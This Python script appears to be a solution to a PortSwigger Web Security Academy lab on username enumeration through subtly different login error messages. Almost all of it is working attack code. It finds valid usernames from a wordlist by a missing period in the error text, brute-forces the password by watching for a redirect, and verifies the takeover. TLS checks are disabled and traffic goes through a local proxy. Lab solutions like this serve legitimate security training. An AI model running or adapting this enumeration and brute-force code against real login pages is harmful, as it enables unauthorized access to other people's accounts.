#!/usr/bin/env python3
# Lab: Username enumeration via subtly different responses
# Lab-Link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses>
# Difficulty: PRACTITIONER
import requests
import shutil
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def login(url, username, password):
    """Atempt to login.
    Return values:
      False On any condition not mentioned below
      1 if response contains string 'Invalid username or password.'
      2 if response contains string 'Invalid username or password'
      3 if response is a redirect
    """
    data = {'username': username, 'password': password}
    r = requests.post(url, data=data, allow_redirects=False, verify=False, proxies=proxies)

    if r.status_code == 302:
        return 3

    res = r.text
    if 'Invalid username or password.' in res:
        return 1

    if 'Invalid username or password' in res:
        return 2

    return False


def enumerate_username(url, username_filename):
    with open(username_filename, 'r') as infile:
        for line in infile:
            username = line.rstrip()
            msg = f'[ ] Brute force username: {username}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
            if login(url, username, 'XXX') == 2:
                msg = f'[+] Username found: {username}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                return username

    msg = f'[-] Failed to find username'
    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
    return False


def enumerate_password(url, username, passwords_filename):
    with open(passwords_filename, 'r') as infile:
        for line in infile:
            password = line.rstrip()
            msg = f'[ ] Brute force password: {password}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
            if login(url, username, password) == 3:
                msg = f'[+] Password found: {password}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                return password
    msg = f'[-] Failed to find password'
    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
    return False


def verify_login(url, username, password):
    data = {'username': username, 'password': password}
    r = requests.post(url, data=data, verify=False, proxies=proxies)
    if f'Your username is: {username}' in r.text:
        return True
    return False


def main():
    print('[+] Username enumeration via subtly different responses')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    url = f'{host}/login'
    username = enumerate_username(f'{url}', '../candidate_usernames.txt')
    if not username:
        sys.exit(-2)

    password = enumerate_password(f'{url}', username, '../candidate_passwords.txt')
    if not password:
        sys.exit(-3)

    if verify_login(url, username, password):
        print(f'[+] Login successful, lab solved')
    else:
        print(f'[-] Login not successful')


if __name__ == "__main__":
    main()
